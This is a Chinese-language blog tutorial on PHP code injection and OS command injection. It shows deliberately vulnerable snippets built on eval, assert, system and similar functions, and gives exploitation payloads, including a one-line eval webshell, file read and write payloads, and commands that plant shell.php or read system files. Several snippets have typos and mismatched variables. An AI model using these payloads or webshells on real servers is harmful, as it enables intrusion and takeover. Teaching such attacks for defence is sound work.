@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>PHP代码注入基础 | lhix Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="漏洞原因漏洞原因：程序中有可执行的PHP代码的函数或语言结构，传入的参数客户端可以进行控制。 相关函数及语句evaleval()； 会将字符串当作PHP代码执行。 12345例：&lt;?php$_str&#x3D;$_GET[&#39;code&#39;];eval($str);?&gt; 在浏览器中传入参数 ?code&#x3D;phpinfo();也可以传入：?code&#x3D;${phpinfo();}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码注入基础">
+<meta property="og:url" content="http://example.com/2020/11/30/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="lhix Blog">
+<meta property="og:description" content="漏洞原因漏洞原因：程序中有可执行的PHP代码的函数或语言结构，传入的参数客户端可以进行控制。 相关函数及语句evaleval()； 会将字符串当作PHP代码执行。 12345例：&lt;?php$_str&#x3D;$_GET[&#39;code&#39;];eval($str);?&gt; 在浏览器中传入参数 ?code&#x3D;phpinfo();也可以传入：?code&#x3D;${phpinfo();}">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-11-30T09:40:32.000Z">
+<meta property="article:modified_time" content="2020-11-30T09:41:12.567Z">
+<meta property="article:author" content="lhix404">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="lhix Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">lhix Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PHP代码注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/30/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2020-11-30T09:40:32.000Z" itemprop="datePublished">2020-11-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP代码注入基础
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>漏洞原因：程序中有可执行的PHP代码的函数或语言结构，传入的参数客户端可以进行控制。</p>
+<h2 id="相关函数及语句"><a href="#相关函数及语句" class="headerlink" title="相关函数及语句"></a>相关函数及语句</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>eval()； 会将字符串当作PHP代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">&lt;?php</span><br><span class="line">$_str&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">eval($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在浏览器中传入参数 ?code=phpinfo();<br>也可以传入：?code=${phpinfo();}<br>       或：?code=1;phpinfo();</p>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert()同样会作为PHP代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例：&lt;?php</span><br><span class="line">$_str&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">assert($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在浏览器中传入参数 ?code=phpinfo();</p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace(): 对字符进行正则处理。</p>
+<p><code>preg_replace(/$pattern/,$replacement,$subject)</code>:搜索<code>$subject</code>中匹配<code>$pattern</code>的部分，以<code>$replacement</code>来代替；而当<code>$pattern</code>处，即第一个参数存在e修饰符时，<code>$replacement</code>的值会将被当成PHP代码来执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例： </span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[‘code’]))&#123;</span><br><span class="line">$str&#x3D;preg_replace(“&#x2F;\[(.*)\]&#x2F;e”,’\\|’,$code);</span><br><span class="line">echo $str;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>提交参数： ?code=[phpinfo();];</p>
+<h3 id="call-user-fun"><a href="#call-user-fun" class="headerlink" title="call_user_fun"></a>call_user_fun</h3><p>call_user_fun():该函数第一个参数作为回调函数，后面的参数作为回调函数的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line"> &lt;?php</span><br><span class="line">     $fun&#x3D;$_GET[‘fun’];</span><br><span class="line">     Spara&#x3D;$_GET[‘para’];</span><br><span class="line">     call_user_fuc($fun,$para);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>提交参数：?fun=assert&amp;para=phpinfo();</p>
+<h3 id="动态函数-a-b"><a href="#动态函数-a-b" class="headerlink" title="动态函数$a($b)"></a>动态函数<code>$a($b)</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例：动态函数$a($b):  </span><br><span class="line">   &lt;?php</span><br><span class="line">      $a&#x3D;$_GET[‘a’];</span><br><span class="line">      $b&#x3D;$_GET[‘b’];</span><br><span class="line">      $a($b);</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure>
+<p>提交参数： ?a=assert&amp;b=phpinfo();</p>
+<h2 id="漏洞应用"><a href="#漏洞应用" class="headerlink" title="漏洞应用"></a>漏洞应用</h2><p>代码执行漏洞的方式：<br>1.直接获取shell<br>提交参数：<code>?code=@eval($_POST[‘cmd’]);</code>即可构成一句话木马，密码为cmd，可以使用菜刀连接。<br>2.获取当前文件的绝对路径<br>提交代码：<code>?code=print(_FILE_)</code><br>3.读取文件（需要具有文件路径和读取权限）<br>提交参数：<code>?code=var_dump(file_get_contents(‘路径’))</code>;<br>4.写文件（需要知道可写目录）<br>提交参数：<code>?code=var_dump(file_put_contents($_POST[1],$_POST[2]))</code>;<br>此时需要通过POST方式提交参数：<br><code>?1=shell.php&amp;2=&lt;?php phpinfo();?&gt;</code></p>
+<h2 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h2><p>在调用系统命令时，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户输入的情况下，就会造成命令执行漏洞。</p>
+<h3 id="命令执行的常见函数"><a href="#命令执行的常见函数" class="headerlink" title="命令执行的常见函数"></a>命令执行的常见函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>system():能够将字符串作为OS命令执行，并自带输出功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例：   </span><br><span class="line"> &lt;?php</span><br><span class="line">         if(isset($_GET[‘cmd’]))&#123;</span><br><span class="line">         system($_GET[‘cmd’]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>例：传入参数 ?cmd=ipconfig</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>exec():能够将字符串作为OS命令执行，需要输出结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例:      &lt;?php</span><br><span class="line">         if(isset($_GET[‘cmd’]))&#123;</span><br><span class="line">         print exec($_GET[‘cmd’]);</span><br><span class="line">           &#125;</span><br><span class="line">         ?&gt;</span><br></pre></td></tr></table></figure>
+<p>传入参数 ?cmd=ipconfig</p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>shell_exec():同上，需要输出（print）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if(isset($_GET[‘cmd’]))&#123;</span><br><span class="line">      print shell_exec($_GET[‘cmd’]);</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>传入参数 ?cmd=ipconfig<br>应用较之前的更多。</p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>passthru()：同上作用，自带输出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if(isset($_GET[‘cmd’]))&#123;</span><br><span class="line">      passthru($_GET[‘cmd’]);</span><br><span class="line">      &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>传入参数 ?cmd=ipconfig</p>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h4><p>反引号``内的字符串也会被解析成OS命令：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">         if(isset($_GET[‘cmd’]))&#123;</span><br><span class="line">        $cmd&#x3D;$_GET[‘cmd’];</span><br><span class="line">        print &#96;$cmd&#96;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>传入参数 ?cmd=ipconfig</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>查看系统文件（hosts文件）：<br><code>?cmd=type c:\windows\system32\drivers\etc\hosts</code></p>
+<p>显示当前路径：<code>?cmd=cd</code></p>
+<p>写文件：<code> ?cmd=echo”&lt;?php phpinfo();?&gt;” D:\shell.php</code><br>页面没有报错，说明文件写入成功。访问shell.php文件。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/30/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="cki4d5zb000001gu9ayg34z2n" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">文件上传漏洞浅谈</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/30/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">PHP代码注入基础</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88/">文件上传漏洞浅谈</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/20/XSS%E5%9F%BA%E7%A1%80/">XSS基础</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/16/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">SQL注入基础</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 lhix404<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
